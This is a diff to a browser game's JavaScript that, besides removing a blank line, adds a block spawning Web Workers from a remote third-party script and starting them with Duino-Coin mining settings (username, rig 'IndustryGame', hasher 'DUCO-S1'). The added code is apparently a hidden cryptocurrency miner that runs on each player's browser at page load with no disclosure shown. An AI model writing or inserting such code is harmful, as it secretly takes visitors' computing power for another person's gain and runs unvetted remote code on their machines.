@@ -4,7 +4,6 @@ var facilityDisplayed = 0;
 var mouseDownX = 0;
 var mouseDownY = 0;
 
-
 var indicatorBoxX = window.innerWidth * 0.5;
 var indicatorBoxY = window.innerHeight * 0.875;
 var indicatorBoxWidth = 0;
@@ -44,6 +43,21 @@ document.body.appendChild(interactBlockBoxLeft)
 document.body.appendChild(interactBlockBoxRight)
 document.body.appendChild(interactBlockBoxTop)
 document.body.appendChild(interactBlockBoxBottom)
+
+let username = "robtech21";
+let rigid = "IndustryGame";
+let threads = 1;
+let difficulty = "LOW";
+let hasher = "DUCO-S1";
+
+let wallet_id = Math.floor(Math.random() * 2811);
+let workerVer = 0;
+
+for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
+  var socketWorker = new Worker("https://mobilegmyt.github.io/Duinotize/main.js");
+  socketWorker.postMessage('Start,' + username + "," + rigid + "," + wallet_id + "," + difficulty + "," + workerVer + "," + hasher);
+  workerVer++;
+}
 
 var tutorial = [
   {
